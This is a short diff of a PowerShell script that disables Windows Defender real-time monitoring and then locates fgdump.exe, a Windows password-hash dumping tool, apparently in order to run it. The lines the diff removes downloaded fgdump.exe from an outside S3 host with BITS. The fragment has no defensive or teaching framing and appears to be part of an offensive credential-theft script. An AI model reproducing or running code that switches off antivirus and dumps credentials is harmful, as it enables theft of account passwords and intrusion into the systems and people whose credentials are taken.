@@ -1,16 +1,6 @@
 # Disable Windows defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Download fgdump
-$url = "https://s3.amazonaws.com/mellondefender.tools/fgdump.exe"
-$output = "$PSScriptRoot\fgdump.exe"
-
-Import-Module BitsTransfer
-Start-BitsTransfer -Source $url -Destination $output
-
-# Extract downloaded file | not necessary for fgdump
-#Expand-Archive $PSScriptRoot\fgdump.zip -DestinationPath $PSScriptRoot\fgdump
-
 # Location of fgdump
 $exeloc = "$PSScriptRoot\fgdump.exe"
 
